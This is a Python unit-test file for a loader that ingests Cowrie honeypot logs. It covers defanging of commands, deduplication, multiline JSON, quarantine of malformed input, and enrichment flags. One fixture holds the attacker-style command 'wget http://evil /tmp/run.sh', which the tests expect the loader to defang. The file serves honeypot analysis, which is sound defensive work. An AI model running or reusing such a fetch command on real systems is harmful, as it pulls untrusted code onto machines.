"""Unit tests for the bulk loader."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Dict

import pytest
from sqlalchemy import Engine, select
from sqlalchemy.orm import sessionmaker

from cowrieprocessor.db import RawEvent, SessionSummary, apply_migrations, create_engine_from_settings
from cowrieprocessor.loader import BulkLoader, BulkLoaderConfig, LoaderCheckpoint
from cowrieprocessor.settings import DatabaseSettings


def _write_events(path: Path, events: list[dict]) -> None:
    """Write events to file, converting timestamp strings to ISO format for JSON serialization."""
    with path.open("w", encoding="utf-8") as fh:
        for event in events:
            # Convert timestamp strings to ISO format if they're datetime objects
            event_copy = event.copy()
            if "timestamp" in event_copy and isinstance(event_copy["timestamp"], str):
                # Keep ISO strings as-is for JSON serialization
                pass
            fh.write(json.dumps(event_copy))
            fh.write("\n")


def _make_engine(tmp_path: Path) -> Engine:
    db_path = tmp_path / "loader.sqlite"
    settings = DatabaseSettings(url=f"sqlite:///{db_path}")
    engine = create_engine_from_settings(settings)
    apply_migrations(engine)
    return engine


def test_bulk_loader_inserts_raw_events(tmp_path: Path) -> None:
    """Loader should persist events, sanitize commands, and populate summaries."""
    events = [
        {
            "session": "abc123",
            "eventid": "cowrie.session.connect",
            "timestamp": "2024-01-01T00:00:00Z",
            "src_ip": "1.2.3.4",
            "sensor": "sensor-a",
        },
        {
            "session": "abc123",
            "eventid": "cowrie.command.input",
            "timestamp": "2024-01-01T00:01:00Z",
            "input": "wget http://evil /tmp/run.sh",
            "sensor": "sensor-a",
        },
    ]
    source = tmp_path / "events.json"
    _write_events(source, events)

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1))
    checkpoints: list[LoaderCheckpoint] = []
    metrics = loader.load_paths([source], checkpoint_cb=checkpoints.append)

    assert metrics.events_inserted == 2
    assert metrics.events_quarantined == 1
    assert checkpoints
    assert checkpoints[-1].sessions == ["abc123"]
    assert checkpoints[-1].events_quarantined == 1

    with engine.connect() as conn:
        payloads = list(conn.execute(select(RawEvent.payload)).all())
        assert len(payloads) == 2
        sanitized = next(row.payload for row in payloads if row.payload.get("input_safe"))
        assert sanitized["input_safe"], "expected sanitized command"
        # With intelligent defanging, the input field contains the defanged version
        assert sanitized.get("input") is not None
        assert "[defang:" in sanitized.get("input", "")
        # Original command should be preserved
        assert sanitized.get("input_original") == "wget http://evil /tmp/run.sh"

        summaries = list(conn.execute(select(SessionSummary)).all())
        assert len(summaries) == 1
        summary = summaries[0]
        assert summary.event_count == 2
        assert summary.command_count == 1
        assert summary.source_files
        assert summary.vt_flagged == 0
        assert summary.dshield_flagged == 0
        assert summary.matcher == "sensor-a"


def test_bulk_loader_is_idempotent(tmp_path: Path) -> None:
    """Loader should tolerate re-ingesting the same file without duplicating rows."""
    events = [
        {
            "session": "def456",
            "eventid": "cowrie.session.connect",
            "timestamp": "2024-02-01T12:00:00Z",
        }
    ]
    source = tmp_path / "reuse.json"
    _write_events(source, events)

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=5))

    first = loader.load_paths([source])
    second = loader.load_paths([source])

    assert first.events_inserted == 1
    assert second.events_inserted == 0
    assert second.duplicates_skipped >= 1


def _write_multiline_events(path: Path, events: list[dict]) -> None:
    """Write events as pretty-printed JSON objects."""
    with path.open("w", encoding="utf-8") as fh:
        for event in events:
            fh.write(json.dumps(event, indent=2))
            fh.write("\n")


def test_bulk_loader_handles_multiline_json(tmp_path: Path) -> None:
    """Loader should parse pretty-printed JSON when multiline_json is enabled."""
    events = [
        {
            "session": "multiline123",
            "eventid": "cowrie.session.connect",
            "timestamp": "2024-01-01T00:00:00Z",
            "src_ip": "1.2.3.4",
        },
        {
            "session": "multiline123",
            "eventid": "cowrie.command.input",
            "timestamp": "2024-01-01T00:01:00Z",
            "input": "ls -la",
        },
    ]
    source = tmp_path / "multiline_events.json"
    _write_multiline_events(source, events)

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1, multiline_json=True))
    metrics = loader.load_paths([source])

    assert metrics.events_inserted == 2
    assert metrics.events_read == 2

    with engine.connect() as conn:
        payloads = list(conn.execute(select(RawEvent.payload)).all())
        assert len(payloads) == 2
        # Verify the events were parsed correctly
        sessions = {payload[0]["session"] for payload in payloads}
        assert sessions == {"multiline123"}


def test_bulk_loader_rejects_multiline_json_by_default(tmp_path: Path) -> None:
    """Loader should reject pretty-printed JSON when multiline_json is disabled."""
    events = [
        {
            "session": "multiline123",
            "eventid": "cowrie.session.connect",
            "timestamp": "2024-01-01T00:00:00Z",
            "src_ip": "1.2.3.4",
        }
    ]
    source = tmp_path / "multiline_events.json"
    _write_multiline_events(source, events)

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1, multiline_json=False))
    metrics = loader.load_paths([source])

    # Should have malformed events due to multiline JSON (6 lines total)
    assert metrics.events_read == 6  # Each line is treated as a separate event
    assert metrics.events_inserted == 0  # Malformed events are quarantined, not inserted
    assert metrics.events_quarantined == 6  # All are quarantined due to validation errors


def test_bulk_loader_mixed_json_formats(tmp_path: Path) -> None:
    """Loader should handle mixed single-line and multiline JSON formats."""
    # Create a file with both formats
    source = tmp_path / "mixed_events.json"
    with source.open("w", encoding="utf-8") as fh:
        # Single-line JSON
        fh.write(
            json.dumps(
                {
                    "session": "single123",
                    "eventid": "cowrie.session.connect",
                    "timestamp": "2024-01-01T00:00:00Z",
                }
            )
        )
        fh.write("\n")

        # Multiline JSON
        fh.write(
            json.dumps(
                {
                    "session": "multi123",
                    "eventid": "cowrie.session.connect",
                    "timestamp": "2024-01-01T00:01:00Z",
                },
                indent=2,
            )
        )
        fh.write("\n")

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1, multiline_json=True))
    metrics = loader.load_paths([source])

    assert metrics.events_inserted == 2
    assert metrics.events_read == 2


class DummyEnrichment:
    """Simple in-memory enrichment stub returning flagged metadata."""

    def __init__(self) -> None:
        """Initialise call tracking containers for the dummy service."""
        self.session_calls: list[tuple[str, str]] = []
        self.file_calls: list[str] = []

    def enrich_session(self, session_id: str, src_ip: str) -> Dict[str, Any]:
        """Return canned session enrichment payload and record invocation."""
        self.session_calls.append((session_id, src_ip))
        return {
            "session_id": session_id,
            "src_ip": src_ip,
            "enrichment": {
                "dshield": {"ip": {"count": "5", "attacks": "10"}},
                "urlhaus": "malware,botnet",
                "spur": ["", "", "", "DATACENTER"],
            },
        }

    def enrich_file(self, file_hash: str, filename: str) -> Dict[str, Any]:
        """Return canned VirusTotal enrichment payload and record invocation."""
        self.file_calls.append(file_hash)
        return {
            "file_hash": file_hash,
            "filename": filename,
            "enrichment": {
                "virustotal": {
                    "data": {
                        "attributes": {
                            "last_analysis_stats": {"malicious": 3},
                        }
                    }
                }
            },
        }


def test_bulk_loader_sets_enrichment_flags(tmp_path: Path) -> None:
    """Loader should populate summary flags when enrichment service is provided."""
    events = [
        {
            "session": "enrich1",
            "eventid": "cowrie.session.connect",
            "timestamp": "2024-03-01T00:00:00Z",
            "src_ip": "203.0.113.10",
            "sensor": "sensor-enrich",
        },
        {
            "session": "enrich1",
            "eventid": "cowrie.session.file_download",
            "timestamp": "2024-03-01T00:01:00Z",
            "shasum": "deadbeef",
            "src_ip": "203.0.113.10",
            "sensor": "sensor-enrich",
        },
    ]
    source = tmp_path / "enrich.json"
    _write_events(source, events)

    engine = _make_engine(tmp_path)
    service = DummyEnrichment()
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=10), enrichment_service=service)
    loader.load_paths([source])

    assert service.session_calls == [("enrich1", "203.0.113.10")]
    assert service.file_calls == ["deadbeef"]

    Session = sessionmaker(bind=engine, future=True)
    with Session() as db_session:
        summary = db_session.query(SessionSummary).filter(SessionSummary.session_id == "enrich1").one()
        assert summary.vt_flagged == 1
        assert summary.dshield_flagged == 1
        assert summary.command_count == 0
        assert summary.matcher == "sensor-enrich"

    with engine.connect() as conn:
        payloads = list(conn.execute(select(RawEvent.payload)).all())
        assert len(payloads) == 2
        sessions = {payload[0]["session"] for payload in payloads}
        assert sessions == {"enrich1"}


# ============================================================================
# Error Path Tests (Phase 1.5 - High ROI Only)
# ============================================================================


def test_bulk_loader_handles_database_connection_error(tmp_path: Path) -> None:
    """Test bulk loader handles database connection failures gracefully.

    Given: A database that fails to connect
    When: Bulk loader attempts to process events
    Then: Exception is raised with clear error message
    """
    from unittest.mock import Mock, patch

    from sqlalchemy.exc import OperationalError

    source = tmp_path / "test.json"
    _write_events(source, [{"session": "test", "eventid": "cowrie.session.connect"}])

    # Mock database engine creation to raise connection error
    with patch('cowrieprocessor.db.create_engine_from_settings') as mock_create_engine:
        mock_engine = Mock()
        mock_engine.connect.side_effect = OperationalError("Connection failed", None, Exception("Connection failed"))
        mock_create_engine.return_value = mock_engine

        config = BulkLoaderConfig(batch_size=100)
        loader = BulkLoader(mock_engine, config)

        # Should raise OperationalError when trying to load
        with pytest.raises(OperationalError, match="Connection failed"):
            loader.load_paths([source])


def test_bulk_loader_handles_empty_log_file(tmp_path: Path) -> None:
    """Test bulk loader handles empty log files without error.

    Given: An empty log file
    When: Bulk loader processes the file
    Then: No events processed, no errors raised
    """
    source = tmp_path / "empty.json"
    source.write_text("")  # Create empty file

    engine = _make_engine(tmp_path)
    config = BulkLoaderConfig(batch_size=100)
    loader = BulkLoader(engine, config)

    result = loader.load_paths([source])

    # Should complete successfully - empty file gets processed as dead letter
    assert result.files_processed == 1
    assert result.events_inserted == 0  # Empty file becomes dead letter event (quarantined, not inserted)
    assert result.events_quarantined == 1  # Empty file is quarantined


def test_bulk_loader_handles_malformed_json(tmp_path: Path) -> None:
    """Test bulk loader handles malformed JSON gracefully.

    Given: A file with invalid JSON
    When: Bulk loader processes the file
    Then: JSONDecodeError is handled, logged, and file marked as failed
    """
    source = tmp_path / "bad.json"
    source.write_text('{"invalid": json}')  # Invalid JSON

    engine = _make_engine(tmp_path)
    config = BulkLoaderConfig(batch_size=100)
    loader = BulkLoader(engine, config)

    result = loader.load_paths([source])

    # Should handle corrupted JSON gracefully
    assert result.events_inserted == 0
    # Should have at least one JSON parsing error (handled by quarantine)
    assert result.events_quarantined >= 1


def test_bulk_loader_multiline_json_malformed_limit(tmp_path: Path) -> None:
    """Loader should handle malformed multiline JSON gracefully."""
    source = tmp_path / "malformed_multiline.json"
    with source.open("w", encoding="utf-8") as fh:
        # Write many lines that don't form valid JSON
        for i in range(150):  # Exceeds the 100-line limit
            fh.write(f"malformed line {i}\n")

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1, multiline_json=True))
    metrics = loader.load_paths([source])

    # Should handle malformed content gracefully
    # The parser accumulates lines until it hits the limit, then creates malformed events
    assert metrics.events_read == 2  # Two malformed events (one at limit, one remaining)


# ============================================================================
# Phase 1: New Error Path Tests (Real Code Execution)
# ============================================================================


def test_bulk_loader_handles_empty_log_file_gracefully(tmp_path: Path) -> None:
    """Test bulk loader handles empty log files without error.

    Given: An empty log file
    When: Bulk loader processes the file
    Then: No events processed, no errors raised
    """
    empty_file = tmp_path / "empty.json"
    empty_file.write_text("")

    engine = _make_engine(tmp_path)
    config = BulkLoaderConfig(batch_size=100)
    loader = BulkLoader(engine, config)

    result = loader.load_paths([empty_file])

    assert result.files_processed == 1
    assert result.events_inserted == 0  # Empty file gets quarantined as dead letter (not inserted)
    assert result.events_quarantined == 1


def test_bulk_loader_handles_malformed_json_gracefully(tmp_path: Path) -> None:
    """Test bulk loader handles malformed JSON gracefully.

    Given: A file with invalid JSON
    When: Bulk loader processes the file
    Then: Error is logged and file marked as failed
    """
    bad_file = tmp_path / "bad.json"
    bad_file.write_text("{invalid json")

    engine = _make_engine(tmp_path)
    config = BulkLoaderConfig(batch_size=100)
    loader = BulkLoader(engine, config)

    result = loader.load_paths([bad_file])

    # Should handle corrupted JSON gracefully by quarantining as dead letter
    assert result.events_inserted == 0  # Malformed JSON gets quarantined, not inserted
    assert result.events_quarantined == 1


def test_bulk_loader_rolls_back_on_database_error(tmp_path: Path) -> None:
    """Test bulk loader rolls back transaction on database errors.

    Given: A valid log file and a database that fails on commit
    When: Bulk loader processes the file
    Then: Transaction is rolled back, no partial data committed
    """
    from unittest.mock import patch

    from sqlalchemy.exc import SQLAlchemyError

    log_file = tmp_path / "valid.json"
    log_file.write_text('{"eventid": "cowrie.login.success", "timestamp": "2024-01-01T00:00:00Z"}')

    engine = _make_engine(tmp_path)
    config = BulkLoaderConfig(batch_size=100)
    loader = BulkLoader(engine, config)

    # Mock the session to raise an error on commit
    with patch.object(engine, 'connect') as mock_connect:
        mock_connection = mock_connect.return_value.__enter__.return_value
        mock_connection.execute.side_effect = SQLAlchemyError("Database error")

        # Should handle database error gracefully
        result = loader.load_paths([log_file])

        # Should not crash, but may have errors
        assert result.files_processed == 1
